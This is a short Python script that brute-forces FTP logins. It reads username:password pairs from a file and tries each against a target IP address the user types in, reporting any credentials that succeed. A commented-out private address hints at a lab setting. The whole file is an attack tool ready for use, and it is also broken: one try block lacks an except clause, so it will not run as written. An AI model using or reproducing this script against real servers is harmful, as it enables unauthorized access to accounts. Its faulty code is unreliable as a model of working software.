#! /usr/bin/python3

import ftplib

def bruteLogin(hostname,passwdFile):
	try:
		pf = open(passwdFile,"r")
	except:
		print("[!!] File Doesn't Exist!")
	for line in pf.readlines():
		print(line)
		username = line.split(":")[0]
		password = line.split(":")[1]
		print("[+] Trying: " + username + "/" + password)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(username,password)
			print("[+] Login Succeed with "+ username +"/"+password)
			ftp.quit()
			return(username,password)

		



#passwordFile ="password02.txt"
#host="192.168.56.102"
host = input("[*] Enter target ip address: ")
passwordFile = input("[*] Enter username password file path: ")
bruteLogin(host,passwordFile)


